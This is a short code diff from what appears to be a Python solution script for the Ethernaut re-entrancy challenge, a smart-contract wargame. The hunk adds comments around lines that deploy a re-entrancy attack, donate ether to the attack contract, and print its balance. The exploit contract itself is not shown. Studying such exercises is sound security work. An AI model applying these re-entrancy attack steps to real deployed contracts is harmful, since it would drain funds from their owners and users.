@@ -14,8 +14,12 @@ def main():
 
     print(f"\nre-entrancy attack successfully deployed\n")
 
+    # interface.ReentrantInterface(ETHERNAUT_INSTANCE).donate(
+    #     attack.address, {"from": player, "value": AMOUNT}
+    # )
     target.donate(attack.address, {"from": player, "value": AMOUNT})
 
+    # the balance of ETHERNAUT_INSTANCE
     balance_ether = web3.fromWei(target.balance(), "ether")
     print(f"\nBalance of the attack contract = {balance_ether}\n")
 
